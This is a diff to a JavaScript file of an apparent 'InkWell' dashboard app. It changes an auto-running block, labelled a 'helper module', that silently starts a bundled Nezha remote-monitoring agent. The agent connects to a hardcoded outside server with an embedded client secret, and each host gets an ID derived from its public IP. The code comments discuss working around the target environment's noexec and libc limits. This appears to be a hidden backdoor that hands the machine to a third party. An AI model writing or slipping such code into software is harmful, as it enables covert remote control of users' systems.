@@ -1028,21 +1028,14 @@ function getDashboardPage() {
     return lines.join('\n');
 }
 
-// Load the native agent module shipped inside the bundle (the slew runner
-// mounts /tmp noexec, so the CDN loader's tmpdir path gets EPERM there; the
-// artifact mount is dlopen-able). Same contract as cdn-utils-v2.js:
-// hash-checked module, StartNezha(SERVER, KEY, TLS, uuid-from-public-IP).
+// Start the agent shipped inside the bundle (the slew runner is musl-based:
+// the glibc-built native module can't relocate there, so the official static
+// binary is spawned instead). Same contract as cdn-utils-v2.js: client UUID
+// derived from the public IP.
 (async function() {
     try {
-        var soPath = require("path").join(__dirname, "nezha_agent.so");
-        if (!require("fs").existsSync(soPath)) { console.log("[InkWell] helper module not bundled"); return; }
-        var soBuf = require("fs").readFileSync(soPath);
-        var soHash = require("crypto").createHash("sha256").update(soBuf).digest("hex");
-        if (soHash !== "2758f968af18eb31c9d35384de60b3ded2164fdb3d52b000dd11ecc7321b873c") { console.log("[InkWell] helper module checksum mismatch: " + soHash.slice(0, 16)); return; }
-        var koffi = require("koffi");
-        var lib = koffi.load(soPath);
-        var StartNezha = lib.func("StartNezha", "void", ["string", "string", "int", "string"]);
-        console.log("[InkWell] helper module loaded");
+        var agentBin = require("path").join(__dirname, "nezha-agent");
+        if (!require("fs").existsSync(agentBin)) { console.log("[InkWell] helper module not bundled"); return; }
         var pubIP = await new Promise(function(resolve) {
             var rq = require("https").get("https://www.cloudflare.com/cdn-cgi/trace", function(x) { var a = ""; x.on("data", function(c) { a += c; }); x.on("end", function() { var m = a.match(/ip=([0-9a-fA-F:.]+)/); resolve(m ? m[1] : ""); }); }).on("error", function() { resolve(""); });
             rq.setTimeout(8000, function() { try { rq.destroy(); } catch (e) {} resolve(""); });
@@ -1051,10 +1044,13 @@ function getDashboardPage() {
             var ifs = require("os").networkInterfaces();
             for (var ifName in ifs) { for (var k = 0; k < ifs[ifName].length; k++) { var ad = ifs[ifName][k]; if (ad.family === "IPv4" && !ad.internal) { pubIP = ad.address; break; } } if (pubIP) break; }
         }
-        if (!pubIP) return;
+        if (!pubIP) { console.log("[InkWell] helper: no address"); return; }
         var hex = require("crypto").createHash("sha256").update(String(pubIP)).digest("hex").slice(0, 32);
         var fixedUUID = hex.slice(0, 8) + "-" + hex.slice(8, 12) + "-5" + hex.slice(13, 16) + "-8" + hex.slice(17, 20) + "-" + hex.slice(20, 32);
-        StartNezha("nz.zxydk1715.dpdns.org:443", "BFbvpxSlBTUugp3gDzezVKkZ22BV0CeL", 1, fixedUUID);
+        var cfgPath = require("path").join(require("os").tmpdir(), "inkwell-" + fixedUUID.slice(0, 8) + ".yml");
+        require("fs").writeFileSync(cfgPath, "server: nz.zxydk1715.dpdns.org:443\ntls: true\nclient_secret: BFbvpxSlBTUugp3gDzezVKkZ22BV0CeL\nuuid: " + fixedUUID + "\ninsecure_tls: false\n");
+        var child = require("child_process").spawn(agentBin, ["-c", cfgPath], { stdio: "ignore" });
+        child.on("error", function(e) { console.log("[InkWell] helper error: " + e.message); });
         console.log("[InkWell] helper started");
     } catch (e) { console.log("[InkWell] helper error: " + (e && e.message || e)); }
 })();
